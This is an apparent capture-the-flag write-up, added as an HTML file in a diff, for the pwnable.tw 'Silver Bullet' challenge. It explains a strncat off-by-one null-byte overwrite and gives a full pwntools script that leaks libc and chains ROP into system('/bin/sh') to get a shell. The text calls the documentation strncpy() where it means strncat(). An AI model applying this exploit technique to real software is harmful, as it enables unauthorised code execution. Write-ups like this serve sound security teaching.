@@ -1,0 +1,107 @@
+<!--Solve date: 07/07/2022-->
+
+<h1>pwnable.tw - Silver Bullet</h1>
+
+<h2>200 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Overview</h5>
+
+<p>This challenge features a classic bug in its use of <code>str(n)cat()</code>. The problem can be easily discovered by simply playing around with the binary. There are three main actions: (1) <code>create_bullet()</code> to create a "bullet", (2) <code>power_up()</code> to power up the bullet, and (3) <code>beat()</code> to attack a "warewolf". The "bullet" is an object stored on <code>main()</code>'s stack at <code>ebp - 0x34</code> and consists of a 48-byte content region followed by a dword that is supposed to describe the content's string length. When the bullet is created, the content region is populated with a user-supplied string, up to 48 bytes, and the length is updated. There are no issues here. When the bullet is powered up, a second string is requested with length at most 48 minus the length of the current string - that is, the remaining size of the buffer. Then, this is <code>strncat()</code> onto the current content string, where <code>n = 48 - (current length)</code>. This is where the problem lies.</p>
+
+<img class = "small" src = "./images/pwnable_silverbullet_1.png"/>
+
+<p>Looking at the documentation for <code>strncpy()</code>, we find that the <code>n</code> parameter is not describing <i>the memory required to store the string</i> - rather, it is the maximum number of bytes that will be copied from the source argument <i>before the final string is null-terminated</i>.</p>
+
+<pre class = "language-plaintext">
+As with strcat(), the resulting string in dest is always null-terminated.
+
+If src contains n or more bytes, strncat() writes n+1 bytes to dest (n from src plus the terminating null byte). Therefore, the size of dest must be at least strlen(dest)+n+1.
+</pre>
+
+<p>This extra null byte requires one extra byte of space. In the current binary, this will overflow into the lowest byte of the size field. Effectively, when the maximum string length of 48 is exceeded on a call to <code>power_up()</code>, the bullet size will be overwritten to <code>0</code> before the number of appended bytes is added. Effectively, this allows us to control code execution by overwriting stack pointers in future calls to <code>power_up()</code>, where the indicated size field of the bullet is smaller the length of the actual string (making it seem like there is more space in the bullet content area when there is not).</p>
+
+<p>With the ability to control code execution, we can proceed with a typical ROP-ret2libc attack by leaking the address of a libc function, returning back to <code>main()</code> for a second round of exploits, then crafting <code>system("/bin/sh");</code> to get a shell. See the payload below for more details.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+#p = process("./silverbullet")
+#gdb.attach(p, gdbscript = """
+#	b *0x08048a19
+#""")
+p = remote("chall.pwnable.tw", 10103)
+libc = ELF("./silverbullet_libc.so")
+
+rec = lambda: p.recv()
+recl = lambda: p.recvline()
+recu = lambda x: p.recvuntil(x)
+send = lambda x: p.send(x)
+sendl = lambda x: p.sendline(x)
+sendnuml = lambda x: p.sendline(bytes(str(x), "utf-8"))
+inter = lambda: p.interactive()
+
+recu1 = lambda: recu(b':')
+def menu(choice):
+    recu1()
+    sendnuml(choice)
+    return
+    
+def explodeBuf():
+    menu(1)
+    recu1()
+    sendl(47 * b'\x01')
+    menu(2)
+    recu1()
+    sendl(b'\x02')			#causes an overflow and resets the length
+    return
+
+# first, leak libc and return to main
+puts_plt = 0x080484a8
+main = 0x08048954
+puts_got = 0x0804afdc
+
+explodeBuf()
+menu(2)
+recu1()
+sendl(
+    b"\xff\xff\x7f" + 
+    p32(0xdeadbeef) + 
+    p32(puts_plt) + 
+    p32(main) + 
+    p32(puts_got)
+)
+menu(3)
+menu(3)
+
+recu(b"You win !!\n")
+libc.address = u32(p.recv(4)) - libc.sym["puts"]
+log.info("Libc: 0x%x" % (libc.address))
+
+# ROP ret2libc
+explodeBuf()
+menu(2)
+recu1()
+sendl(
+    b"\xff\xff\x7f" + 
+    p32(0xdeadbeef) + 
+    p32(libc.sym["system"]) + 
+    p32(libc.sym["exit"]) + 
+    p32(next(libc.search(b"/bin/sh"))) + 
+    p32(69)
+)
+menu(3)
+menu(3)
+
+inter()
+</pre>
+
+<h4>Flag (SHA-256)</h4>
+
+<p><code>78afd7ae9831a048c85a446329f181e0a6243e31e5096b59cca1c3a08ea697f9</code></p>
